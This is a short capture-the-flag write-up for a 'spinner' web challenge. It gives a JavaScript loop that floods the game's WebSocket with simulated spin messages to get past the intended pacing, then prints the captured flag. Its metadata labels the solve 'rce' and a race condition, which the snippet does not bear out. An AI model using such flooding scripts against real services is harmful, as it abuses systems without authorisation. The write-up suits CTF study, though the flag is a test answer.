---
ai_date: 2025-04-27 05:23:01
ai_summary: Exploited race condition in real-time socket communication to bypass rate limiting and obtain flag.
ai_tags:
  - race
  - socket
  - rce
created: 2024-06-14T16:44
points: 380
solves: 204
updated: 2025-07-14T09:46
---

> angstromctf's spinner was too easy... and not annoying enough
> [https://spinner.vsc.tf](https://spinner.vsc.tf/)

Seems simple enough, I will play along and simulate the user's spin... but at **light speed** mwahahaha.

```js
socket.addEventListener("message", (event) => {
  console.log(event.data);
});
function move(angle){
    const message = {
        x: Math.cos(angle),
        y: Math.sin(angle),
        centerX: 0,
        centerY: 0
    };
    socket.send(JSON.stringify(message));
}
for(let i=0;i<11000*Math.PI*2;i+=Math.PI) move(i)
```

```flag
vsctf{i_ran_out_of_flag_ideas_so_have_this_random_string_2CSJzbfeWqVBnwU5q8}
```